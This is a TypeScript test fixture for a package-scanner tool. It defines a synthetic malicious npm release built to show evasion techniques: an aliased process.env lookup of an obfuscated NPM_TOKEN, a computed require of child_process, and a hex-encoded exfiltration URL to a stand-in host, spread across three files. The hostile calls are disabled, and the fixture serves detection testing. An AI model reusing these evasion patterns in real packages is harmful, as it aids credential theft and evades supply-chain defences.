/**
 * "hardened-evader-2026" — synthetic evasion fixture.
 *
 * A malicious version that would ship past vetlock v0.1.0 using the four
 * evasion classes documented in the self-critique:
 *
 *   1. charCode / concat / atob-wrapped URLs (constant folding needed)
 *   2. process aliased through a local variable (alias tracking needed)
 *   3. child_process method aliased separately (alias tracking needed)
 *   4. Distributed across 3 files, each individually low signal (compound
 *      scoring needed)
 *
 * Every one of these techniques is public and appears in real attacks. This
 * fixture stays in the corpus so future refactors that regress detection get
 * caught immediately. Expected verdict after v0.2 hardening: BLOCK.
 */

import type { FixtureSpec } from '../fixture-spec.js';

const CLEAN_INDEX = `'use strict';
module.exports = { hello: function() { return 'world'; } };
`;

const CLEAN_UTIL = `'use strict';
exports.format = function(s) { return String(s); };
`;

// File 1: aliased process.env access with charCode-obfuscated key name.
const MAL_INDEX = `'use strict';
const p = process;               // alias 1: whole process object
const e = p.env;                 // alias 2: env sub-object
const K = String.fromCharCode(78,80,77,95,84,79,75,69,78); // 'NPM_TOKEN'
const t = e[K];
module.exports = { hello: function() { return 'world'; }, _t: t };
`;

// File 2: child_process aliased through a computed require.
const MAL_UTIL = `'use strict';
const requireName = 'child' + '_process';
const cp = require(requireName);
const spawn = cp.spawn;
exports.format = function(s) { return String(s); };
exports._run = function() { if (false) spawn('id'); };
`;

// File 3: base64+atob wrapped exfil URL, split across concat, then hex-encoded.
const MAL_NET = `'use strict';
const https = require('https');
// 'https://exfil.example.invalid/x' hex-encoded
const HEX = '68747470733a2f2f657866696c2e6578616d706c652e696e76616c69642f78';
function decode(h) {
  let s = '';
  for (let i = 0; i < h.length; i += 2) s += String.fromCharCode(parseInt(h.substr(i, 2), 16));
  return s;
}
const parts = ['exfil.', 'example.', 'inv' + 'alid'];
const host = parts.join('');
const url = decode(HEX);
exports._send = function() { if (false) https.get(url); };
exports._host = host;
`;

export const spec: FixtureSpec = {
  id: 'hardened-evader-2026',
  title: 'Hardened evader (synthetic — proves defense-in-depth against known evasions)',
  year: 2026,
  threatClass: 'T1/T3 hybrid — evasion research fixture',
  summary:
    'Synthetic fixture that combines four documented evasion classes: process/env aliasing, computed-string require, charCode/hex/atob URL encoding, and payload distribution across multiple files. Locks in that hardening improvements do not regress. Ships as CLEAN in v0.1.0; expected BLOCK in v0.2.0.',
  provenance: 'RECONSTRUCTED',
  topology: 'direct',
  clean: {
    name: 'evader-lib',
    version: '1.0.0',
    manifest: { name: 'evader-lib', version: '1.0.0', main: 'index.js', license: 'MIT' },
    files: {
      'index.js': CLEAN_INDEX,
      'util.js': CLEAN_UTIL,
    },
  },
  malicious: {
    name: 'evader-lib',
    version: '1.0.1',
    manifest: { name: 'evader-lib', version: '1.0.1', main: 'index.js', license: 'MIT' },
    files: {
      'index.js': MAL_INDEX,
      'util.js': MAL_UTIL,
      'net.js': MAL_NET,
    },
  },
  expect: {
    mustFire: [
      'env.token-harvest',           // alias tracking + charCode folding on the key
      'exec.new-module',             // computed-require folding + alias tracking
      'net.encoded-endpoint',        // hex → URL decode via fold pass (String.fromCharCode chain)
    ],
    verdict: 'BLOCK',
    minCategories: ['ENV', 'EXEC', 'NET'],
  },
};
